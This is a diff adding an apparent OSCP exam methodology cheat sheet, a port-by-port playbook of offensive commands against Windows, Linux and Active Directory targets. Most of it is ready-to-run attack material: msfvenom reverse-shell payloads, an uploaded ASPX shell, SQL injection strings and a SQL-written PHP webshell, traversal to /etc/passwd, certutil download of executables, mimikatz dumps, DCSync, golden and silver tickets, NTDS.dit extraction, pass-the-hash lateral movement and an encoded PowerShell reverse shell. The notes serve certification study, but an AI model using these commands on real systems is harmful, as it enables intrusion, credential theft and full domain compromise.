@@ -1,0 +1,680 @@
+Methodology:
+Review these sites if you get stuck
+https://book.hacktricks.wiki/en/index.html
+
+Start every terminal command with this, and label the IP address in the terminal window
+export target=ip
+
+You can use responder on the OSCP, but it has to be this:
+Sudo responder -I tun0 -A -v 
+You can not use posing in any way. 
+
+Recon:
+nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt
+run nmap 2x, review the log
+
+Use Unicorn scan as well:
+unicornscan -v -I -i <interface> -mT <target_IP_address_or_range>
+Note: most likely use tun0
+
+Then work on each port
+Easy wins
+port 21: 
+Can I get anonymous access
+Can I use the get or put commands
+Review the website as well:
+https://hackviser.com/tactics/pentesting/services/ftp
+
+With MS FTP:
+Make the shell:
+msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=443 -f asp > shell.aspx
+nc -lvnp 433
+ftp $target
+anonymous
+anonymous
+put shell.aspx
+ls (to check)
+curl http://$target:21/shell.aspx 
+check netcat 
+
+What version is the ftp? If it's vsftpd 2.3.4, there's a Metasploit for that, and if there is a Metasploit module, then there is a repo on GitHub.
+https://github.com/saisathvik1/OSCP-Cheatsheet
+
+
+Ssh 22:
+use for many ways, but also not an easy win at times, but a leverage to get access and also to PrivEsc
+Don't bother with Windows, but also review this link:
+https://github.com/saisathvik1/OSCP-Cheatsheet
+Additionally, basic SSH may not work sometimes. Run this with the RSA method:
+ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@$target
+
+
+Telnet 23:
+banner grabbing and get access anonymously
+
+Smtp 25:
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smtp-enumeration-port-25
+Also good to review, too, not just SMTP
+
+DNS 53:
+enumerate 
+
+pop3 110:
+enumerate 
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/pop3-port-110-25
+
+For SQL, 1433, 3306, 5432, 1521, 
+default creds?
+yes, 
+PostgreSQL:
+https://github.com/squid22/PostgreSQL_RCE
+Mongo as well:
+https://www.exploit-db.com/exploits/24947
+
+Others, review these:
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mssql-port-1433
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/oracle-port-152
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mysql-port-3306
+
+
+SMB 139/445:
+Can I get access with no user or guest account?
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smb-enumeration
+enum4linux-ng $target | tee enum4linuxng.log
+Find the list as well:
+smbclient -L \\\\$target\
+netexec smb $target -u 'guest' -p '' --shares
+smbmap -H $target
+
+Also --rid-brute is your friend 
+netexec smb $target -u 'guest' -p '' --rid-brute
+
+Then, if you found something in the list
+smbclient -U "" '//$target/Sharename/' 
+then run 
+dir 
+cd (to path)
+dir
+mget* (get the file) 
+Note this could be a database, txt, xlsm, code, get it, you most likely will 
+
+To upload
+smbmap -H $target --upload example.exe 'Share\example.exe'
+
+One win that is worth trying:
+lookupsid.py anonymous@target
+
+Brute force (be careful):
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $target  -vvvv -oN userspasssmb.txt
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $target smb
+
+EASY WIN WITH SAMBA:
+Samba 2.2.7a
+
+searchsploit -m multiple/remote/10.c
+
+gcc 10.c -o 10  
+
+./10 -b 0 -c me -v $target
+whoami
+Check for root
+
+
+RPC 135:
+rpcclient -U "" -N $target
+Note: or with a user 
+
+Commands:
+srvvinfo
+endumdomusers
+getdompwinfo
+
+Dumb user creds with null or without:
+impacket-rpcdump domain.local/"":""@$target
+
+SNMP 161:
+snmp check:
+snmpcheck -t $target -c public
+Review link:
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion
+
+NFS 111,2049:
+rpcinfo -p $target
+
+Mount NFS share:
+Show all
+showmount -e $target
+Review link:
+https://gabb4r.gitbook.io/oscp-notes/service-enumeration/nfs-enumeration-port-111-2049
+
+RDP 3389:
+nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
+I wouldn't try to brute-force this because accounts can be closed, but Hydra command just in case:
+
+impacket has rdp_check:
+rdp_check <domain>/<name>:<password>@<IP>
+just to verify accounts
+
+Connect to RDP:
+xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
+xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
+
+LDAP 389, 3268:
+ldapsearch -x -H ldap://<IP>:<port> -b "dc=first,dc=local" 
+./windapsearch.py -d first.local --dc-ip $target -U (users)
+./windapsearch.py -d first.local --dc-ip $target --custom "objectClass=*" > ldap.txt
+cat ldap.txt | grep svc (or user account)
+impacket-GetNPUsers first.local/user -dc-ip $target -no-pass
+Find the NTML password
+john hash.txt w=/usr/share/wordlist/rockyou.txt
+
+evil-winrm 5985 or 5986:
+You can pass the hash with:
+evil-winrm -i $target -u administrator -H <hash value, first set of ntml string>
+evil-winrm -i $target -u administrator -p <password> 
+runs PowerShell, use the upload command
+
+Add a user if you can
+net user hacker abc123! /add /domain
+net group "Group from blood hound" hacker /add
+net localgroup "Group" hacker /add (try to use "Remote Management Users")
+upload PowerView.ps1
+.\powerview.ps1
+$pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-object
+Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync
+Back to the Kali machine:
+impacket-secretsdump domain/hacker@$target
+Should get admin password hash
+evil-winrm -i $target -u administrator -H <hash value, first set of ntml string>
+
+
+
+Also can run impacket-psexec pass the hash attack
+impacket-psexec Administrator@$target -hashes partone:parttwo
+or pass the hash evil-winrm
+
+
+Port 3128 "squid":
+https://github.com/HackingHusky/OSCP/blob/main/proxy-curl.sh
+run this script and ask, can I piggy back off this and proxy back to a different web port like 8080
+Then add it to foxy proxy to enumerate to the webservice. 
+
+Redis 6379:
+This was in the playgrounds and worth mentioning:
+Banner grab and look for 5.0.9 redis and get this repo
+https://github.com/n0b0dyCN/redis-rogue-server
+Run this:
+git clone https://github.com/n0b0dyCN/redis-rogue-server
+Run this next, or follow the directions:
+cd RedisModulesSDK/exp/
+make
+cd back to the main repo with the Python script
+run: chmod +x redis-rogue-server.py
+
+Then be sure to run this:
+python3 redis-rogue-server.py --rhost $target --rport 6379 --lhost your ip --lport 6379
+Note: rport and lport must be 6379
+Should get root
+
+Website enumerations and also easy wins:
+80,443,8080,8081, etc...
+Did you check /robots.txt?
+Any port can be used for websites, really, or technology 
+run scan 
+Look at the technology from nmap
+Example grandpa from Hack the Box:
+MS IIS/6.0 
+Go to the website and look for technology using Wappalyzer
+Google dork:
+"IIS 6.0" exploit
+could have a repo or a Metasploit module
+
+Review with this site:
+https://github.com/saisathvik1/OSCP-Cheatsheet
+
+Directory Traversal:
+So what you want to do is to display the path here 
+The goal is to get a username or the shadow file, so that you can obtain a user account and password. 
+In Linux, you want to get to the users in this path:
+cat /etc/passwd
+
+But on a website, its most likely reached out to here:
+cat ../../etc/passwd
+cat ../../../etc/passwd
+So try to reach out this:
+http://$target.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+Or even curl it:
+curl http://$target.com/meteor/index.php?page=../../../../../../../../../etc/passwd 
+Windows:
+http://$target:port/public/plugins/alertlist/../../../../../../../../Users/install.txt
+
+Sometimes its encoded:
+curl http://$target/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+File inclusion:
+http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
+Review this one a bit more
+
+SQL injection:
+probably best in burpsuite but also remember all these commands:
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+
+You can not use SQLMAP on the test, so don't bother. 
+But you can make a bind shell:
+http://$target/blindsqli.php?user=user' AND IF (1=1, sleep(3),'false') -- //
+
+Also stealing this one from the site mentioned:
+Run Imacket when you find admin account
+kali> impacket-mssqlclient Administrator:Lab123@$target -windows-auth #To login
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+#Now we can run commands
+EXECUTE xp_cmdshell 'whoami';
+
+#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
+#Now we can exploit it
+http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+
+Finding exploits:
+searchsploit or database
+Don't forget to Google dork "" exploit with Wappalzer
+
+Quick msfvenom:
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+use this website:
+https://www.revshells.com/
+
+Then, once on PrivEsc, the machine
+
+Sharing folders from the attack machine:
+python3 -m http.server 9999
+9999 is pretty open for the test
+Then use the certuil:
+certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+wget http://www.example.com/example.zip - linux
+Also, in RDP, use a browser
+scp -r /local/directory/ username@remote_host:/remote/directory/ - use for ssh
+curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+
+Password cracking:
+test first for all these:
+admin:admin
+postgred:postgred
+admin:password
+
+Spray in list:
+password
+password1
+Password1
+Password@123
+password@123
+admin
+administrator
+admin@123
+
+
+hashcat -m <number> hash wordlists.txt --force
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
+
+ssh cracking:
+ssh2john.py id_rsa > hash
+#Convert the obtained hash to John format(above link)
+john hashfile --wordlist=rockyou.txt
+
+cracking shadow files:
+sudo unshadow /etc/passwd /etc/shadow > password_hashes.txt 
+john --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt or john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt
+john --show password_hashes.txt
+
+hydra -l -P <password_list> ssh://<target_ip>
+https://gabb4r.gitbook.io/oscp-notes/password-attacks/brute-force-service-password
+
+
+Linux PrivEsc:
+
+Could you check the easy things first?
+Run these:
+history
+sudo -l
+Run find / -perm -4000 2> /dev/null
+systemctl list-timers -cronjob check
+uname -a (check for kernel version)
+ps aux | grep "^root" 
+
+Port forwarding is an option as well:
+netstat -tulpn 
+ss -tulpn 
+ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
+Check the ports before you do
+Examples, a lot of Hack the Box labs show these 
+
+Then use linPeas:
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+Excellent links as well:
+https://gtfobins.github.io/ - shows bins and ways to get root
+https://github.com/DominicBreuker/pspy - shows cronjobs to be exploited 
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://juggernaut-sec.com/port-forwarding-lpe/
+
+Windows PrviEsc:
+Run these first (PowerShell preferred):
+whoami /priv
+system info
+Get-History
+arp -a 
+
+try to make a new user: 
+net user hacker hacker123 /add
+net localgroup Administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /ADD
+
+
+
+WinPeas:
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+Please be sure to look for gold. Red is a huge maybe; it will work. Yellow or gold means yes, I can do that.
+
+
+
+God potato when seen SEImpersonate Privilege is enabled:
+https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71
+https://github.com/BeichenDream/GodPotato/releases?source=post_page-----400b88403a71---------------------------------------
+You can also use other potatoes, but use a good potato for now.
+More of the potato's
+#Printspoofer
+PrintSpoofer.exe -i -c powershell.exe 
+PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
+
+#RoguePotato
+RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
+
+#GodPotato
+GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd "shell.exe"
+
+#JuicyPotatoNG
+JuicyPotatoNG.exe -t * -p "shell.exe" -a
+
+#SharpEfsPotato
+SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+#writes whoami command to w.log file
+
+
+Use Mimikatz as well, 
+https://github.com/ParrotSec/mimikatz
+follow the steps, but you may need a user with more admin creds, also great with AD enumeration and PrivEsc.
+
+If you get a base64 password, use CyberChef 
+https://gchq.github.io/CyberChef/
+
+Run Sharphound/Bloodhound for use on an AD user:
+https://github.com/SpecterOps/BloodHound
+https://www.kali.org/tools/bloodhound/
+
+Also, use powerup.ps1
+https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.psd1
+DO NOT USE THE AUTOPWN FEATURE!!
+
+You can also use Crackmap to check the account to verify things:
+https://github.com/byt3bl33d3r/CrackMapExec
+
+DLL Hijacking:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
+move it to machine
+make listener
+Restart the service
+
+Check AlwaysInstallElevated:
+#For checking, it should return 1 or Ox1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+#Creating a reverseshell in msi format
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi
+
+#Execute and get shell
+msiexec /quiet /qn /i reverse.msi
+
+review notes:
+https://github.com/saisathvik1/OSCP-Cheatsheet
+
+
+PIVOIT:
+As Ross from Friends would scream 100% at his friends while moving a couch, this is important thing to have screemed in the back of your head.
+review this link:
+https://medium.com/@saintlafi/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022
+
+Portfowarding:
+Run ifconfig/ipconfig first
+netstat -r
+
+Now create the tunnel:
+ssh -L port:localhost:port Ubuntu@<IPaddressofTarget>
+netstat -antp | grep port -important to check the ports out!
+ssh -L port:localhost:port 8080:localhost:8080 ubuntu@<IPaddressofTarget> - forward all from port 
+
+Change socks from 4 to 5
+
+Or use these:
+https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2
+https://notchxor.github.io/oscp-notes/6-post-exploitation/4.4-pivoting+tunneling/
+https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69
+
+I'm also dumb, use this:
+
+#Creating interface and starting it.
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+#Kali machine - Attacker machine
+./proxy -laddr 0.0.0.0:9001 -selfcert
+
+#windows or linux machine - compromised machine
+agent.exe -connect <LHOST>:9001 -ignore-cert
+
+#In Ligolo-ng console
+session #select host
+ifconfig #Notedown the internal network's subnet
+start #after adding relevent subnet to ligolo interface
+
+#Adding subnet to ligolo interface - Kali linux
+sudo ip r add <subnet> dev ligolo
+
+
+
+AD Pentesting:
+Check for the groups:
+net localgroup Administrators #to check local admins 
+
+Powerview the server:Import-Module .\PowerView.ps1 #loading module to powershell, if it gives an error then change the execution policy
+Get-NetDomain #basic information about the domain
+Get-NetUser #list of all users in the domain
+# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is a sideheading for the output of the above command. we can select any number of them seperated by comma.
+Get-NetGroup # enumerate domain groups
+Get-NetGroup "group name" # information from specific group
+Get-NetComputer # enumerate the computer objects in the domain
+Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
+Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
+Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
+Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
+Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 
+
+# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
+Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 
+
+Find-DomainShare #find the shares in the domain
+
+Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
+
+Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
+
+Bloodhound:
+# Sharphound - transfer sharphound.ps1 into the compromised machine
+Import-Module .\Sharphound.ps1 
+Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
+
+# Bloodhound-Python
+bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
+
+commands next:
+sudo neo4j console
+password
+
+review the blood hound site from Kali
+
+Domain dump, ldap:
+sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
+
+Impacket:
+# with a NULL session
+Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+
+# with cleartext credentials
+Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+# pass-the-hash (with an NT hash)
+Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+# parse a local file
+Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
+
+Check smb shares, always check them:
+crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
+
+but now with an admin account and decrypt CPassword
+gpp-decrypt "password"
+
+Golden Ticket
+Get the krbtgt hash
+.\mimikatz.exe
+privilege::debug
+#below are some ways
+lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /patch
+lsadump::dcsync /user:krbtgt
+
+kerberos::purge #removes any exisiting tickets
+
+#sample command
+kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden
+
+#Saved with name "golden" here, there are other options to check as well
+Obtaining access!
+mimikatz.exe #no need for highest privileges
+kerberos::ptt golden
+misc::cmd #we're accessing cmd
+
+Shadow Copies
+vshadow.exe -nw -p C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+AS-REP Roasting
+impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
+.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
+
+hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
+Kerberoasting
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
+
+impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
+
+hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
+Silver Tickets
+Obtaining hash of an SPN user using Mimikatz
+privilege::debug
+sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
+Obtaining Domain SID
+ps> whoami /user
+# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
+Forging silver ticket Ft Mimikatz
+kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
+exit
+
+# we can check the tickets by,
+ps> klist
+Accessing service
+ps> iwr -UseDefaultCredentials <servicename>://<computername>
+Secretsdump
+secretsdump.py <domain>/<user>:<password>@<IP>
+secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
+secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
+Dumping NTDS.dit
+secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
+#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
+
+DCOM
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+Pass the ticket
+.\mimikatz.exe
+sekurlsa::tickets /export
+kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
+klist
+dir \\<RHOST>\admin$
+
+winrs -r:<computername> -u:<user> -p:<password> "command"
+# run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
+# run this on windows session
+
+Lateral Movement in Active Directory
+psexec - smbexec - wmiexec - atexec
+Here we can pass the credentials or even hash, depending on what we have
+Always pass the full hash to these tools!
+
+psexec.py <domain>/<user>:<password1>@<IP>
+# the user should have write access to Admin share then only we can get sesssion
+
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+smbexec.py <domain>/<user>:<password1>@<IP>
+
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+wmiexec.py <domain>/<user>:<password1>@<IP>
+
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
+#we passed full hash here
